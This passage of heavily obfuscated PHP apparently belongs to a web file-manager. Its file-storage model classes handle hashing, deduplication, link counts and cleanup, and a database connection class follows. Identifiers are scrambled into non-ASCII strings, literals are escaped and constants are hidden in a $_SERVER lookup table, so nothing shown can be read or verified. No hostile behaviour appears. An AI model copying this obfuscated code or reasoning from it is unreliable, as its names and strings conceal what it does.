$²İ¸‹ ? $²İ¸‹ : array(); } public function removeTarget($øª¬Æœ, $øÚ©ÎÔ¶) { $Ûğıö¾ =& $_SERVER[¶Ô„œ…¯]; if (!$øÚ©ÎÔ¶) { return !0; } $øÚ©ÎÔ¶ = is_array($øÚ©ÎÔ¶) ? $øÚ©ÎÔ¶ : array($øÚ©ÎÔ¶); $´×¯Éƒ = array($Ûğıö¾[190] => $øª¬Æœ, $Ûğıö¾[571] => array($Ûğıö¾[7], $øÚ©ÎÔ¶)); $ÚĞ­ã£« = $this->field($Ûğıö¾[2017])->where($´×¯Éƒ)->select(); $øäšô¿Í = array_to_keyvalue($ÚĞ­ã£«, $Ûğıö¾[12], $Ûğıö¾[2017]); if (!$øäšô¿Í) { return !0; } $´×¯Éƒ = array($Ûğıö¾[2017] => array($Ûğıö¾[7], $øäšô¿Í)); $this->where($´×¯Éƒ)->delete(); Model($Ûğıö¾[2020])->where($´×¯Éƒ)->delete(); Model($Ûğıö¾[2029])->where($´×¯Éƒ)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\137\146\151\x6c\x65\137\x63\x6f\156\x74\145\x6e\164\163"; protected $dataAuto = array(array("\143\162\145\141\x74\x65\x54\x69\155\x65", "\x74\151\x6d\145", "\x69\156\x73\145\162\x74", "\146\165\156\x63\x74\x69\157\x6e")); } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x66\151\154\x65"; protected $tableMeta = array("\164\x61\x62\x6c\145\x4e\141\x6d\x65" => "\151\157\137\x66\151\154\x65\137\155\x65\164\x61", "\155\x65\164\x61\x46\151\145\154\x64" => "\x66\151\154\145\x49\104"); public function fileInfo($ëæÅÑ£õ) { $Øªèû±± =& $_SERVER[¶Ô„œ…¯]; static $¿Â£‡« = array(); if (!isset($¿Â£‡«[$ëæÅÑ£õ])) { $Ø§˜¬í = $Øªèû±±[2030]; $÷ÌÔéÎ = Model($Øªèû±±[546])->field($Ø§˜¬í)->where(array($Øªèû±±[544] => $ëæÅÑ£õ))->find(); $¿Â£‡«[$ëæÅÑ£õ] = $÷ÌÔéÎ; } return $¿Â£‡«[$ëæÅÑ£õ]; } public function addFileByContent($ªØÖ«‚‚ = '', $ó«¢úş = '') { $×‹”ø‹Â =& $_SERVER[¶Ô„œ…¯]; $ûšèå¬ = TEMP_PATH . $×‹”ø‹Â[2031]; if (!is_dir($ûšèå¬)) { mk_dir($ûšèå¬); } $Â°Ø˜µš = $ûšèå¬ . $×‹”ø‹Â[2032] . rand_string(16); file_put_contents($Â°Ø˜µš, $ªØÖ«‚‚); $Õ½µÜÅÓ = $this->addFile($Â°Ø˜µš, $ó«¢úş, !0); if (file_exists($Â°Ø˜µš)) { @unlink($Â°Ø˜µš); } return $Õ½µÜÅÓ; } public function createFileName($ö§äÒßÒ, $±ì‘Û£Ê = false, $ÙıÓ»é­ = false) { $’äˆé =& $_SERVER[¶Ô„œ…¯]; $¶‰áÊŸş = IO::init($’äˆé[8]); $üáù÷Ü‰ = $this->makeFilePath($ö§äÒßÒ, $¶‰áÊŸş, $±ì‘Û£Ê, $ÙıÓ»é­); $¡÷®¤‰  = $¶‰áÊŸş->pathFather($üáù÷Ü‰); static $£œ–ÇìÖ = false; $®Äå« = $’äˆé[2033] . md5($¡÷®¤‰ ); if (!$£œ–ÇìÖ && !Cache::get($®Äå«)) { $£œ–ÇìÖ = !0; $÷–ùé = IO::mkdir($¡÷®¤‰ ); if (!IO::exist($÷–ùé . $’äˆé[876])) { IO::mkfile($÷–ùé . $’äˆé[876]); } Cache::set($®Äå«, 1, 3600 * 2); } return $üáù÷Ü‰; } public function makeFilePath($€ãÍ—ê, $óÄÔÚ¥È, $ã¼¸™ôÊ = false, $Ÿ¥²÷öê = false) { $Ë›Şàœ‘ =& $_SERVER[¶Ô„œ…¯]; $™Õ–ˆèõ = Model($Ë›Şàœ‘[848])->get($Ë›Şàœ‘[2034]); $Ê©¹™œ’ = KodIO::defaultIO() . date($Ë›Şàœ‘[2035]); $³İÊ³Ãá = $Ê©¹™œ’ . rand_string(5) . short_id(100); $€ãÍ—ê = str_replace($Ë›Şàœ‘[8], $Ë›Şàœ‘[11], KodIO::clear($€ãÍ—ê)); $·½Øï’ = $óÄÔÚ¥È->ext($€ãÍ—ê); if (!$€ãÍ—ê) { $™Õ–ˆèõ = $Ë›Şàœ‘[854]; } switch ($™Õ–ˆèõ) { case $Ë›Şàœ‘[2036]: if ($·½Øï’) { $³İÊ³Ãá = $³İÊ³Ãá . $Ë›Şàœ‘[10] . $·½Øï’; } if ($·½Øï’ == $Ë›Şàœ‘[1972]) { $³İÊ³Ãá .= $Ë›Şàœ‘[1298]; } break; case $Ë›Şàœ‘[2037]: $’¨½Öêš = Model($Ë›Şàœ‘[848])->get($Ë›Şàœ‘[849]); $ı°à¸’‡ = substr(md5($Ë›Şàœ‘[850] . $’¨½Öêš . date($Ë›Şàœ‘[827])), 0, 8); $¼” ¥Ñ§ = KodIO::defaultDriver(); $Ê©¹™œ’ = $Ë›Şàœ‘[1329] . $¼” ¥Ñ§[$Ë›Şàœ‘[477]] . $Ë›Şàœ‘[486] . date($Ë›Şàœ‘[2038]) . $ı°à¸’‡ . $Ë›Şàœ‘[8]; if ($·½Øï’ == $Ë›Şàœ‘[1972]) { $€ãÍ—ê .= $Ë›Şàœ‘[1298]; } $Æ®Š¾” = $Ë›Şàœ‘[2039] . $Ê©¹™œ’ . $€ãÍ—ê; CacheLock::lock($Æ®Š¾”); $³İÊ³Ãá = $Ê©¹™œ’ . $€ãÍ—ê; if (IO::exist($Ê©¹™œ’ . $€ãÍ—ê)) { $€–‹²–ú = substr($€ãÍ—ê, 0, strlen($€ãÍ—ê) - strlen($·½Øï’)); $¾¦ÍÉà = $Ÿ¥²÷öê ? substr($Ÿ¥²÷öê, 0, 5) : ($ã¼¸™ôÊ ? substr($ã¼¸™ôÊ, 0, 5) : rand_string(5)); $³İÊ³Ãá = $Ê©¹™œ’ . $€–‹²–ú . $¾¦ÍÉà; if ($·½Øï’) { $³İÊ³Ãá = $³İÊ³Ãá . $Ë›Şàœ‘[10] . $·½Øï’; } } if (IO::isOsDriver($³İÊ³Ãá) && !IO::isUploadServer($³İÊ³Ãá)) { if (IO::exist($³İÊ³Ãá)) { return $³İÊ³Ãá; } $úßï£ÓÃ = IO::setContent($³İÊ³Ãá, $Ë›Şàœ‘[12]); if (!$úßï£ÓÃ) { show_json($Ë›Şàœ‘[2040], !1); } } CacheLock::unlock($Æ®Š¾”); break; case $Ë›Şàœ‘[854]: break; default: break; } return $³İÊ³Ãá; } public function addFileByRemote($Ğ…ÑÔ’‰, $¬ƒáß¦õ, $¥¼³§œÒ = array()) { $«ó¨ş² =& $_SERVER[¶Ô„œ…¯]; if (!IO::exist($Ğ…ÑÔ’‰)) { return !1; } $êß¸†å° = $¥¼³§œÒ[$«ó¨ş²[549]] ? $¥¼³§œÒ[$«ó¨ş²[549]] : $«ó¨ş²[12]; $•àÁÊãş = IO::hashMd5($Ğ…ÑÔ’‰, $êß¸†å°); $Å‰Éù…› = KodIO::defaultDriver(); $¦ƒÄôğÕ = array($«ó¨ş²[622] => IO::size($Ğ…ÑÔ’‰), $«ó¨ş²[2041] => 1, $«ó¨ş²[496] => $¬ƒáß¦õ, $«ó¨ş²[887] => $Å‰Éù…›[$«ó¨ş²[477]], $«ó¨ş²[497] => $Ğ…ÑÔ’‰, $«ó¨ş²[2042] => $¥¼³§œÒ[$«ó¨ş²[677]] ? $¥¼³§œÒ[$«ó¨ş²[677]] : IO::hashSimple($Ğ…ÑÔ’‰), $«ó¨ş²[2043] => $•àÁÊãş ? $•àÁÊãş : $êß¸†å°); if ($…‚Ï‘½ = $this->addFileCheckExist($¦ƒÄôğÕ[$«ó¨ş²[677]], $¦ƒÄôğÕ[$«ó¨ş²[549]], $¦ƒÄôğÕ[$«ó¨ş²[79]])) { return $…‚Ï‘½; } return $this->addFileData($¦ƒÄôğÕ); } private function addFileData($¿ëñÛœ) { $õ¦Ê¯—Ê =& $_SERVER[¶Ô„œ…¯]; if (!$¿ëñÛœ) { return !1; } $¿ëñÛœ[$õ¦Ê¯—Ê[79]] = intval($¿ëñÛœ[$õ¦Ê¯—Ê[79]]); if (!$¿ëñÛœ[$õ¦Ê¯—Ê[79]] && strlen($¿ëñÛœ[$õ¦Ê¯—Ê[677]]) > 32) { $¿ëñÛœ[$õ¦Ê¯—Ê[79]] = intval(substr($¿ëñÛœ[$õ¦Ê¯—Ê[677]], 32)); } $ßÓÕ”Ë = $this->add($¿ëñÛœ); return $this->find($ßÓÕ”Ë); } public function addFile($ÆıŞ¾å”, $•ÖõŒ¹«, $¨ÇªÉÜä = false) { $Üõ ­£æ =& $_SERVER[¶Ô„œ…¯]; $›ÍĞÈ®‘ = IO::hashSimple($ÆıŞ¾å”); $ÏĞó¼ÒÙ = IO::size($ÆıŞ¾å”); $÷‹ª×á“ = $ÏĞó¼ÒÙ <= 1024 * 1024 * 10 ? IO::hashMd5($ÆıŞ¾å”) : $Üõ ­£æ[12]; $½ñ¿Ÿ·Ì = $Üõ ­£æ[2044] . $›ÍĞÈ®‘; CacheLock::lock($½ñ¿Ÿ·Ì); if ($÷‹ª×á“ && $›ÍĞÈ®‘) { $Èí¯´Ä = $this->addFileCheckExist($›ÍĞÈ®‘, $÷‹ª×á“, $ÏĞó¼ÒÙ); if ($Èí¯´Ä) { CacheLock::unlock($½ñ¿Ÿ·Ì); return $Èí¯´Ä; } } $³È˜–öˆ = $this->addFileMake($ÆıŞ¾å”, $ÏĞó¼ÒÙ, $›ÍĞÈ®‘, $÷‹ª×á“, $•ÖõŒ¹«, $¨ÇªÉÜä); $ç¢“äœ = $this->addFileData($³È˜–öˆ); CacheLock::unlock($½ñ¿Ÿ·Ì); if (!$÷‹ª×á“ && $ç¢“äœ) { $this->fileMd5Check($ç¢“äœ); } return $ç¢“äœ; } public function fileMd5Check($şîğÙ­) { $¸İƒ±Ö =& $_SERVER[¶Ô„œ…¯]; $²…ÂÅ­ = array($şîğÙ­[$¸İƒ±Ö[543]], $şîğÙ­[$¸İƒ±Ö[87]]); $ğ‘«Û = $¸İƒ±Ö[2045] . $şîğÙ­[$¸İƒ±Ö[87]]; $ì·ğÖšØ = $¸İƒ±Ö[2046] . $şîğÙ­[$¸İƒ±Ö[543]]; TaskQueue::add($¸İƒ±Ö[2047], $²…ÂÅ­, $ğ‘«Û, $ì·ğÖšØ); } public function fileMd5Set($Ïäê¼ß¥, $¯ëºà±ã) { $´¥’šˆ =& $_SERVER[¶Ô„œ…¯]; $¾®ƒşªÈ = $this->find($Ïäê¼ß¥); if (!$¾®ƒşªÈ || $¾®ƒşªÈ[$´¥’šˆ[549]]) { return; } $¥º‡ö¯ª = IO::hashMd5($¯ëºà±ã); if (!$¥º‡ö¯ª) { return $´¥’šˆ[12]; } $this->where(array($´¥’šˆ[543] => $Ïäê¼ß¥))->save(array($´¥’šˆ[549] => $¥º‡ö¯ª)); } public function addFileMake($—á “‘, $ßó×¯Øç, $›ç¹†æö, $ŠşøäùÕ, $ë£Ÿ¾ƒ®, $ûÍÖÅı) { $ìà…›‰‰ =& $_SERVER[¶Ô„œ…¯]; $àÒ¥—Ğ€ = $this->createFileName($ë£Ÿ¾ƒ®, $›ç¹†æö, $ŠşøäùÕ); $¥Ü®¯ÛÎ = get_path_father($àÒ¥—Ğ€); $––Ù—ìŠ = get_path_this($àÒ¥—Ğ€); if ($ûÍÖÅı) { $ÈÊƒ“öÉ = IO::move($—á “‘, $¥Ü®¯ÛÎ, !1, $––Ù—ìŠ); } else { $ÈÊƒ“öÉ = IO::copy($—á “‘, $¥Ü®¯ÛÎ, !1, $––Ù—ìŠ); } if (!$ÈÊƒ“öÉ) { return !1; } $ş‘€¦±Ã = KodIO::defaultDriver(); $§Õ£ë¼î = array($ìà…›‰‰[622] => $ßó×¯Øç, $ìà…›‰‰[2041] => 1, $ìà…›‰‰[496] => $ë£Ÿ¾ƒ®, $ìà…›‰‰[887] => $ş‘€¦±Ã[$ìà…›‰‰[477]], $ìà…›‰‰[497] => $àÒ¥—Ğ€, $ìà…›‰‰[2042] => $›ç¹†æö, $ìà…›‰‰[2043] => $ŠşøäùÕ); return $§Õ£ë¼î; } public function addFileCheckExist($…éåğï°, $¯ÛÍöÁ, $­‚ºÊ£ä) { $š¿‹¶ßë =& $_SERVER[¶Ô„œ…¯]; $šÑ”á× = $this->findByHash($…éåğï°, $¯ÛÍöÁ); if (!$šÑ”á×) { return !1; } $‹öÇĞÒÍ = array($š¿‹¶ßë[2041] => intval($šÑ”á×[$š¿‹¶ßë[2048]]) + 1, $š¿‹¶ßë[622] => $­‚ºÊ£ä); $this->where(array($š¿‹¶ßë[544] => $šÑ”á×[$š¿‹¶ßë[543]]))->save($‹öÇĞÒÍ); return $šÑ”á×; } public function remove($ĞÜÈÊá) { $this->linkCountChange($ĞÜÈÊá, !1); $this->clearEmpty(); return !0; } public function linkAdd($Ô»ù“¥ø) { $this->linkCountChange($Ô»ù“¥ø, !0); } public function linkCountChange($Ú¡¥çº, $ˆèÙ¥) { $ùÃ¢ä½ =& $_SERVER[¶Ô„œ…¯]; if (!$Ú¡¥çº) { return; } if (!is_array($Ú¡¥çº)) { $Ú¡¥çº = array($Ú¡¥çº); } $ ¥õäÆó = array(); foreach ($Ú¡¥çº as $ì¸Œ­×Ç) { $û»™Æ³ = $ì¸Œ­×Ç . $ùÃ¢ä½[12]; if (!$ ¥õäÆó[$û»™Æ³]) { $ ¥õäÆó[$û»™Æ³] = 0; } $ ¥õäÆó[$û»™Æ³]++; } $†²â×È¬ = array(); foreach ($ ¥õäÆó as $ì¸Œ­×Ç => $¶‰º°Îê) { $û»™Æ³ = $¶‰º°Îê . $ùÃ¢ä½[12]; if (!$†²â×È¬[$û»™Æ³]) { $†²â×È¬[$û»™Æ³] = array(); } $†²â×È¬[$û»™Æ³][] = $ì¸Œ­×Ç; } foreach ($†²â×È¬ as $¶‰º°Îê => $Ââ”ë¤) { if (!$Ââ”ë¤) { continue; } $¶‰º°Îê = $ˆèÙ¥ ? $¶‰º°Îê : -intval($¶‰º°Îê); $İè°ÕÁ· = array($ùÃ¢ä½[543] => array($ùÃ¢ä½[7], $Ââ”ë¤)); if ($¶‰º°Îê < 0) { $İè°ÕÁ·[$ùÃ¢ä½[2048]] = array($ùÃ¢ä½[1099], abs($¶‰º°Îê)); } $this->where($İè°ÕÁ·)->setAdd($ùÃ¢ä½[2048], $¶‰º°Îê); } } public function findByHash($¡üˆÚÉß, $à‡Ãûøß = false) { $·ÀŒÇ˜Õ =& $_SERVER[¶Ô„œ…¯]; if (!$¡üˆÚÉß && !$à‡Ãûøß) { return !1; } $ÑŸÎí–û = array($·ÀŒÇ˜Õ[2042] => $¡üˆÚÉß); if ($à‡Ãûøß) { $ÑŸÎí–û = array($·ÀŒÇ˜Õ[2043] => $à‡Ãûøß); } return $this->order($·ÀŒÇ˜Õ[2049])->where($ÑŸÎí–û)->find(); } public function clearEmpty($—±½ïÅã = 0) { $–å’€±± =& $_SERVER[¶Ô„œ…¯]; $ØµÎ¬ß£ = time() - 3600 * 24 * $—±½ïÅã; $·«äæ› = $–å’€±±[2050] . $ØµÎ¬ß£; $šëÔæÒ… = $this->where($·«äæ›)->select(); if (!$šëÔæÒ…) { return; } $©‘èÔòÖ = new Task($–å’€±±[2051], $–å’€±±[12], count($šëÔæÒ…)); foreach ($šëÔæÒ… as $Ï»›«) { $©‘èÔòÖ->update(1); $this->resetFile($Ï»›«); } $©‘èÔòÖ->end(); } public function resetFile($‘¦ÏÈ) { $ÊôŸÄûŞ =& $_SERVER[¶Ô„œ…¯]; $§¬É¯ = array($ÊôŸÄûŞ[544] => $‘¦ÏÈ[$ÊôŸÄûŞ[543]]); $¥ƒ¥Ã­ = Model($ÊôŸÄûŞ[1428])->where($§¬É¯)->count(); $´Ğ¨øÁŒ = Model($ÊôŸÄûŞ[2052])->where($§¬É¯)->count(); $ÏÃ›×áº = intval($¥ƒ¥Ã­) + intval($´Ğ¨øÁŒ); if ($ÏÃ›×áº == 0) { IO::remove($‘¦ÏÈ[$ÊôŸÄûŞ[87]]); Model($ÊôŸÄûŞ[2053])->delete($‘¦ÏÈ[$ÊôŸÄûŞ[543]]); $this->where($§¬É¯)->delete(); $this->metaSet($‘¦ÏÈ[$ÊôŸÄûŞ[543]], null, null); write_log(ACTION . $ÊôŸÄûŞ[2054] . KodUser::id() . $ÊôŸÄûŞ[2055] . $‘¦ÏÈ[$ÊôŸÄûŞ[543]] . $ÊôŸÄûŞ[2056] . $‘¦ÏÈ[$ÊôŸÄûŞ[79]] . $ÊôŸÄûŞ[201] . $‘¦ÏÈ[$ÊôŸÄûŞ[87]], $ÊôŸÄûŞ[2057]); return; } if ($‘¦ÏÈ[$ÊôŸÄûŞ[2048]] != $ÏÃ›×áº) { $this->where($§¬É¯)->save(array($ÊôŸÄûŞ[2041] => $ÏÃ›×áº)); } } public function storageInfo($±Õ«ÄÏ = false) { $¨İû÷»’ =& $_SERVER[¶Ô„œ…¯]; $‚²ÜùÕ” = $this->count() + 0.0; $ö—äŸıÉ = 0; $Åƒâ’ñö = 1; $øÁâÚš = 0; $ë¥¶–’² = 5000; for ($ìû¹° = 0; $ìû¹° < $‚²ÜùÕ”; $ìû¹° = $ìû¹° + $ë¥¶–’²) { $õ–†Ø±¦ = $this->limit($ìû¹°, $ìû¹° + $ë¥¶–’²)->select(); foreach ($õ–†Ø±¦ as $”“ÉÖ¸) { $Åƒâ’ñö += $”“ÉÖ¸[$¨İû÷»’[79]] * $”“ÉÖ¸[$¨İû÷»’[2048]]; $ö—äŸıÉ += $”“ÉÖ¸[$¨İû÷»’[79]] * ($”“ÉÖ¸[$¨İû÷»’[2048]] - 1); $øÁâÚš += $”“ÉÖ¸[$¨İû÷»’[2048]]; } } $Ü‰„í¹õ = array($¨İû÷»’[2058] => $Åƒâ’ñö, $¨İû÷»’[2059] => $ö—äŸıÉ, $¨İû÷»’[2060] => $ö—äŸıÉ / $Åƒâ’ñö, $¨İû÷»’[83] => $‚²ÜùÕ”, $¨İû÷»’[2061] => $øÁâÚš); return $Ü‰„í¹õ; } } goto Aï£ÍŸÛºó; eÊİ²°İ: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\150\151\156\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\75", "\x6e\145\x71" => "\x3c\x3e", "\x67\164" => "\x3e", "\145\147\164" => "\76\x3d", "\x6c\164" => "\74", "\x65\154\164" => "\74\75", "\156\x6f\x74\154\x69\x6b\145" => "\116\117\x54\40\114\x49\x4b\105", "\x6c\151\x6b\145" => "\114\x49\x4b\x45", "\151\x6e" => "\x49\x4e", "\156\157\x74\151\156" => "\x4e\x4f\124\x20\111\x4e", "\156\x6f\x74\x20\x69\156" => "\x4e\117\124\40\x49\116", "\x62\x65\164\167\x65\145\x6e" => "\x42\x45\124\127\105\x45\x4e", "\x6e\157\164\x62\145\x74\x77\145\145\156" => "\x4e\117\124\40\102\x45\x54\x57\105\105\x4e", "\156\x6f\x74\x20\x62\145\x74\x77\x65\x65\x6e" => "\116\117\x54\x20\102\105\x54\x57\105\105\116"); protected $selectSql = "\123\105\x4c\x45\x43\x54\45\x44\x49\x53\x54\111\116\103\124\45\x20\45\x46\111\x45\x4c\x44\x25\40\106\122\x4f\x4d\40\x25\x54\101\x42\114\105\45\x25\112\117\111\x4e\45\45\x57\110\x45\x52\105\x25\x25\x47\122\117\x55\x50\45\45\x48\101\x56\111\116\107\45\45\x4f\x52\x44\x45\122\45\x25\x4c\111\x4d\111\x54\45\x20\45\125\x4e\111\x4f\116\45\45\x43\x4f\115\x4d\105\116\124\45"; protected $bind = array(); public static function getInstance() { $Ëæôù–… = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[¶Ô„œ…¯][1044], $Ëæôù–…); } public function factory($±˜øÑ°í = '') { $º»‚’Ÿ± =& $_SERVER[¶Ô„œ…¯]; $±˜øÑ°í = $this->parseConfig($±˜øÑ°í); if (empty($±˜øÑ°í[$º»‚’Ÿ±[1045]])) { think_exception(think_lang($º»‚’Ÿ±[1046])); } $this->dbType = ucwords(strtolower($±˜øÑ°í[$º»‚’Ÿ±[1045]])); $¯§¬æúì = $º»‚’Ÿ±[1047] . $this->dbType; if (class_exists($¯§¬æúì)) { $ÍèÏèÇ‡ = new $¯§¬æúì($±˜øÑ°í); if ($º»‚’Ÿ±[1048] != strtolower($±˜øÑ°í[$º»‚’Ÿ±[1045]])) { $ÍèÏèÇ‡->dbType = strtoupper($this->dbType); } else { $ÍèÏèÇ‡->dbType = $this->_getDsnType($±˜øÑ°í[$º»‚’Ÿ±[1000]]); } } else { think_exception(think_lang($º»‚’Ÿ±[1049]) . $º»‚’Ÿ±[1050] . $¯§¬æúì); } return $ÍèÏèÇ‡; } public function __call($¿Àå“¢Û, $¾¯¾›ı) { if (method_exists($this, $¿Àå“¢Û)) { return call_user_func_array(array($this, $¿Àå“¢Û), $¾¯¾›ı); } } protected function _getDsnType($üú–š) { $ñÆÖ¥Š = explode($_SERVER[¶Ô„œ…¯][4], $üú–š); $€Òèşê§ = strtoupper(trim($ñÆÖ¥Š[0])); return $€Òèşê§; } private function parseConfig($»–ï´ª = '') { $¯ÜŞ«ïú =& $_SERVER[¶Ô„œ…¯]; if (!empty($»–ï´ª) && is_string($»–ï´ª)) { $»–ï´ª = $this->parseDSN($»–ï´ª); } elseif (is_array($»–ï´ª)) { $»–ï´ª = array_change_key_case($»–ï´ª); $»–ï´ª = array($¯ÜŞ«ïú[1045] => $»–ï´ª[$¯ÜŞ«ïú[1051]], $¯ÜŞ«ïú[972] => $»–ï´ª[$¯ÜŞ«ïú[1052]], $¯ÜŞ«ïú[973] => $»–ï´ª[$¯ÜŞ«ïú[1053]], $¯ÜŞ«ïú[970] => $»–ï´ª[$¯ÜŞ«ïú[1054]], $¯ÜŞ«ïú[971] => $»–ï´ª[$¯ÜŞ«ïú[1055]], $¯ÜŞ«ïú[21] => $»–ï´ª[$¯ÜŞ«ïú[1056]], $¯ÜŞ«ïú[1000] => $»–ï´ª[$¯ÜŞ«ïú[1057]], $¯ÜŞ«ïú[17] => isset($»–ï´ª[$¯ÜŞ«ïú[1058]]) ? $»–ï´ª[$¯ÜŞ«ïú[1058]] : array()); } elseif (empty($»–ï´ª)) { if (think_config($¯ÜŞ«ïú[1059]) && $¯ÜŞ«ïú[1048] != strtolower(think_config($¯ÜŞ«ïú[1060]))) { $»–ï´ª = $this->parseDSN(think_config($¯ÜŞ«ïú[1059])); } else { $»–ï´ª = array($¯ÜŞ«ïú[1045] => think_config($¯ÜŞ«ïú[1060]), $¯ÜŞ«ïú[972] => think_config($¯ÜŞ«ïú[1061]), $¯ÜŞ«ïú[973] => think_config($¯ÜŞ«ïú[1062]), $¯ÜŞ«ïú[970] => think_config($¯ÜŞ«ïú[1063]), $¯ÜŞ«ïú[971] => think_config($¯ÜŞ«ïú[1064]), $¯ÜŞ«ïú[21] => think_config($¯ÜŞ«ïú[325]), $¯ÜŞ«ïú[1000] => think_config($¯ÜŞ«ïú[1059]), $¯ÜŞ«ïú[17] => think_config($¯ÜŞ«ïú[1065])); } } return $»–ï´ª; } protected function initConnect($âù´İäÜ = true) { if (1 == think_config($_SERVER[¶Ô„œ…¯][22])) { $this->_linkID = $this->multiConnect($âù´İäÜ); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $Ã÷äŸš => $Ï×ôƒ‚) { $this->_linkID = $Ï×ôƒ‚; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($ÛâåšãË = false) { $çÖ«ƒß€ =& $_SERVER[¶Ô„œ…¯]; static $Œ°˜İÅ = array(); static $¨˜Êºå™ = -1; if (empty($Œ°˜İÅ)) { foreach ($this->config as $Å§ü±á => $±¢àŞÃ‚) { $Œ°˜İÅ[$Å§ü±á] = explode($çÖ«ƒß€[50], $±¢àŞÃ‚); } } if (think_config($çÖ«ƒß€[1066])) { if ($ÛâåšãË || think_config($çÖ«ƒß€[473]) === !0) { $¸ÅåŠæè = floor(mt_rand(0, think_config($çÖ«ƒß€[1067]) - 1)); $¨˜Êºå™ = $¸ÅåŠæè; } else { if (is_numeric(think_config($çÖ«ƒß€[1068]))) { $¸ÅåŠæè = think_config($çÖ«ƒß€[1068]); } else { $¸ÅåŠæè = floor(mt_rand(think_config($çÖ«ƒß€[1067]), count($Œ°˜İÅ[$çÖ«ƒß€[970]]) - 1)); } } } else { $¸ÅåŠæè = floor(mt_rand(0, count($Œ°˜İÅ[$çÖ«ƒß€[970]]) - 1)); $¨˜Êºå™ = $¸ÅåŠæè; } $¸ÅåŠæè = $¨˜Êºå™ !== -1 ? $¨˜Êºå™ : $¸ÅåŠæè; $„íªÍ‰è = array($çÖ«ƒß€[972] => isset($Œ°˜İÅ[$çÖ«ƒß€[972]][$¸ÅåŠæè]) ? $Œ°˜İÅ[$çÖ«ƒß€[972]][$¸ÅåŠæè] : $Œ°˜İÅ[$çÖ«ƒß€[972]][0], $çÖ«ƒß€[973] => isset($Œ°˜İÅ[$çÖ«ƒß€[973]][$¸ÅåŠæè]) ? $Œ°˜İÅ[$çÖ«ƒß€[973]][$¸ÅåŠæè] : $Œ°˜İÅ[$çÖ«ƒß€[973]][0], $çÖ«ƒß€[970] => isset($Œ°˜İÅ[$çÖ«ƒß€[970]][$¸ÅåŠæè]) ? $Œ°˜İÅ[$çÖ«ƒß€[970]][$¸ÅåŠæè] : $Œ°˜İÅ[$çÖ«ƒß€[970]][0], $çÖ«ƒß€[971] => isset($Œ°˜İÅ[$çÖ«ƒß€[971]][$¸ÅåŠæè]) ? $Œ°˜İÅ[$çÖ«ƒß€[971]][$¸ÅåŠæè] : $Œ°˜İÅ[$çÖ«ƒß€[971]][0], $çÖ«ƒß€[21] => isset($Œ°˜İÅ[$çÖ«ƒß€[21]][$¸ÅåŠæè]) ? $Œ°˜İÅ[$çÖ«ƒß€[21]][$¸ÅåŠæè] : $Œ°˜İÅ[$çÖ«ƒß€[21]][0], $çÖ«ƒß€[1000] => isset($Œ°˜İÅ[$çÖ«ƒß€[1000]][$¸ÅåŠæè]) ? $Œ°˜İÅ[$çÖ«ƒß€[1000]][$¸ÅåŠæè] : $Œ°˜İÅ[$çÖ«ƒß€[1000]][0], $çÖ«ƒß€[17] => isset($Œ°˜İÅ[$çÖ«ƒß€[17]][$¸ÅåŠæè]) ? $Œ°˜İÅ[$çÖ«ƒß€[17]][$¸ÅåŠæè] : $Œ°˜İÅ[$çÖ«ƒß€[17]][0]); return $this->connect($„íªÍ‰è, $¸ÅåŠæè); } public function parseDSN($ğµ»Œ†) { $¨Åè¬ôğ =& $_SERVER[¶Ô„œ…¯]; if (empty($ğµ»Œ†)) { return !1; } $îğè’÷ = parse_url($ğµ»Œ†); if ($îğè’÷[$¨Åè¬ôğ[207]]) { $İï‹²ÊØ = array($¨Åè¬ôğ[1045] => $îğè’÷[$¨Åè¬ôğ[207]], $¨Åè¬ôğ[972] => isset($îğè’÷[$¨Åè¬ôğ[667]]) ? $îğè’÷[$¨Åè¬ôğ[667]] : $¨Åè¬ôğ[12], $¨Åè¬ôğ[973] => isset($îğè’÷[$¨Åè¬ôğ[1069]]) ? $îğè’÷[$¨Åè¬ôğ[1069]] : $¨Åè¬ôğ[12], $¨Åè¬ôğ[970] => isset($îğè’÷[$¨Åè¬ôğ[208]]) ? $îğè’÷[$¨Åè¬ôğ[208]] : $¨Åè¬ôğ[12], $¨Åè¬ôğ[971] => isset($îğè’÷[$¨Åè¬ôğ[209]]) ? $îğè’÷[$¨Åè¬ôğ[209]] : $¨Åè¬ôğ[12], $¨Åè¬ôğ[21] => isset($îğè’÷[$¨Åè¬ôğ[87]]) ? substr($îğè’÷[$¨Åè¬ôğ[87]], 1) : $¨Åè¬ôğ[12]); } else { preg_match($¨Åè¬ôğ[1070], trim($ğµ»Œ†), $úÙÜÖ‚ó); $İï‹²ÊØ = array($¨Åè¬ôğ[1045] => $úÙÜÖ‚ó[1], $¨Åè¬ôğ[972] => $úÙÜÖ‚ó[2], $¨Åè¬ôğ[973] => $úÙÜÖ‚ó[3], $¨Åè¬ôğ[970] => $úÙÜÖ‚ó[4], $¨Åè¬ôğ[971] => $úÙÜÖ‚ó[5], $¨Åè¬ôğ[21] => $úÙÜÖ‚ó[6]); } $İï‹²ÊØ[$¨Åè¬ôğ[1000]] = $¨Åè¬ôğ[12]; return $İï‹²ÊØ; } protected function debug() { $Öı´°¬ =& $_SERVER[¶Ô„œ…¯]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $Öı´°¬[1071]; if (think_config($Öı´°¬[1072])) { think_status($Öı´°¬[1073]); think_trace($this->queryStr . $Öı´°¬[1074] . think_status($Öı´°¬[24], $Öı´°¬[1073], 6) . $Öı´°¬[1075], $Öı´°¬[12], $Öı´°¬[1076]); } } protected function parseLock($†µ¯öÎ‡ = false) { $ë³®¯Å =& $_SERVER[¶Ô„œ…¯]; if (!$†µ¯öÎ‡) { return $ë³®¯Å[12]; } if ($ë³®¯Å[1002] == $this->dbType) { return $ë³®¯Å[1077]; } return $ë³®¯Å[1078]; } protected function 